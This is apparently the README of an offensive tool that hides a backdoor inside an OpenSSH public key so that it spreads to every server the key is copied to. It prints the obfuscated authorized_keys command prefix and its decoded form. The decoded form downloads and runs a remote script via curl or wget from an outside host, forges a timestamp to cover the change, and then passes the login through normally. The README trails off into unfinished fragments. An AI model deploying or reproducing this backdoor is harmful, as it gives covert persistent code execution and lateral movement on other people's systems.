# ssh-key-backdoor

This program generates a backdoor that hides inside an OpenSSH public key (e.g. `id_rsa.pub` or `authorized_keys`). The backdoor will execute when the user logs in next.

The objective is to use the ssh public key to move laterally within a target network. It exploits the fact that users copy their *public* ssh key `id_rsa.pub` to other servers without checking the content. Any server where their public key is copied will automatically get backdoored.

```console
$ ./ssh-key-backdoor.sh
```

The *public* key is then changed to:
```shell
command="`###---AUTH-DO-NOT-REMOVE---`;bash -c '{ eval $(echo |xxd -r -ps);}'" ssh-ed25519 AAAAC3Nzablahblshblah.... x@y
```

This goes deep down the Bash rabbit hole...the curious reader may like to look at the cleartext:
```shell
./ssh-key-backdoor.sh clear
command="`###---AUTH-DO-NOT-REMOVE---`;bash -c '{
  [[ $(stat -c%Y /bin/sh) != $(stat -c%Y .ssh) ]] && {
    touch -r /bin/sh .ssh
    export KEY=\"\"
    bash -c \"$(curl -fsSL thc.org/sshx)\" || bash -c \"$(wget --no-verbose -O- thc.org/sshx)\" || exit 0
  } >/dev/null 2>/dev/null &
  [[ -n $SSH_ORIGINAL_COMMAND ]] && exec $SSH_ORIGINAL_COMMAND
  [[ -z $SHELL ]] && SHELL=/bin/bash
  [[ -f /run/motd.dynamic ]] && cat /run/motd.dynamic
  [[ -f /etc/motd ]] && cat /etc/motd
  exec -a -$(basename $SHELL) $SHELL;}'"
```
and one day I shall 
There is some great bash 
